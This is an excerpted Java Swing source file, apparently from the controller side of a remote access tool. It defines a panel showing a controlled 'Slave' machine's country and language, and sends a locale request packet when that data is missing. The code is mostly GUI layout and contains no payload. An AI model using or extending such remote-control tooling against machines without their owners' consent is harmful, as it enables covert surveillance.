...
import pro.jrat.client.Locale;
import pro.jrat.client.Slave;
import pro.jrat.client.packets.outgoing.Packet97Locales;
import pro.jrat.client.ui.renderers.table.LocaleTableRenderer;
...
public class PanelControlLocales extends PanelControlParent {
	...
	public PanelControlLocales(Slave sl) {
		...
		groupLayout.setHorizontalGroup(groupLayout.createParallelGroup(Alignment.LEADING).addGroup(groupLayout.createSequentialGroup().addGroup(groupLayout.createParallelGroup(Alignment.LEADING).addGroup(groupLayout.createSequentialGroup().addContainerGap().addComponent(panel, GroupLayout.PREFERRED_SIZE, 581, GroupLayout.PREFERRED_SIZE)).addGroup(groupLayout.createSequentialGroup().addGap(18).addGroup(groupLayout.createParallelGroup(Alignment.LEADING).addGroup(groupLayout.createSequentialGroup().addComponent(lblCountrys).addPreferredGap(ComponentPlacement.UNRELATED).addComponent(lblCountry)).addComponent(lblDisplayCountry)).addGap(33).addGroup(groupLayout.createParallelGroup(Alignment.LEADING).addComponent(lblDisplayLanguage).addComponent(lblLanguage)))).addContainerGap(GroupLayout.DEFAULT_SIZE, Short.MAX_VALUE)));
		groupLayout.setVerticalGroup(groupLayout.createParallelGroup(Alignment.TRAILING).addGroup(groupLayout.createSequentialGroup().addGap(19).addGroup(groupLayout.createParallelGroup(Alignment.BASELINE).addComponent(lblCountrys).addComponent(lblCountry).addComponent(lblLanguage)).addPreferredGap(ComponentPlacement.RELATED).addGroup(groupLayout.createParallelGroup(Alignment.BASELINE).addComponent(lblDisplayCountry).addComponent(lblDisplayLanguage)).addPreferredGap(ComponentPlacement.RELATED, 53, Short.MAX_VALUE).addComponent(panel, GroupLayout.PREFERRED_SIZE, 233, GroupLayout.PREFERRED_SIZE).addContainerGap()));
		...
		if (slave.getLocales() == null) {
			slave.addToSendQueue(new Packet97Locales());
		} else {
			load();
		}
	}
